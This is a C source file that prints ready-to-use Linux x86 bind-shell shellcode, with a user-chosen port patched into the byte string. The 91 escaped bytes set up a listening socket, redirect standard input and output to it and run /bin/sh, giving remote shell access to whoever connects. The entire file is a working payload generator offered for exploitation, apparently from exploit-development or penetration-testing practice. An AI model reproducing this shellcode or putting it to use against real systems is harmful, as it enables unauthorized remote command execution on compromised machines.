/******************************************************************
*    make-bindshell -- Program to generate bind shellcode
* 
*    Author   : Re4son re4son [ at ] whitedome.com.au
*    Purpose  : generates bind shell code with port given as argument
*    Usage    : make-bindshell <port>
******************************************************************/


#include <stdio.h>
#include <string.h>

int main( int argc, char *argv[] )
{
    unsigned int port;
    char low,high;
    char cmdArg[6];
    int i;

    if (argc > 1 && strlen(argv[1]) <=5){
        strcpy(cmdArg, argv[1]);

        // Make sure that the argument contains nothing but digits
        for (i = 0; i < strlen(cmdArg); i++){
            if (!isdigit(cmdArg[i])){
                printf("Port must be a number\n");
		printf("Usage: %s <port>\n", argv[0] );
                return 1;
            }
         }

      // Convert argument from C string to integer
      port = atoi(cmdArg);
      high = port >> 8;
      low = (port << 8) >> 8;
      } else {

	printf("Usage: %s <port>\n", argv[0] );
	return 1;
    }

    printf(  "Shellcode length : 91 bytes\n"
	     "Bind port (%05d): \\x%02x\\x%02x (Check for bad chars)\n\n"

	     "\"\\x31\\xdb\\xf7\\xe3\\xb3\\x01\\x6a\\x06\\x53\\x6a\\x02\\x89\\xe1\\xb0\"\n"
	     "\"\\x66\\x89\\xc7\\xcd\\x80\\x96\\x43\\x52\\x66\\x68\\x%02x\\x%02x\\x66\\x53\"\n"
	     "\"\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x89\\xf8\\xcd\\x80\\x52\\x56\"\n"
	     "\"\\xb3\\x04\\x89\\xe1\\x89\\xf8\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n"
	     "\"\\x89\\xf8\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\"\n"
	     "\"\\x79\\xf9\\x89\\xd1\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n"
	     "\"\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\";\n\n", port, high, low, high, low);

    return 0;

}
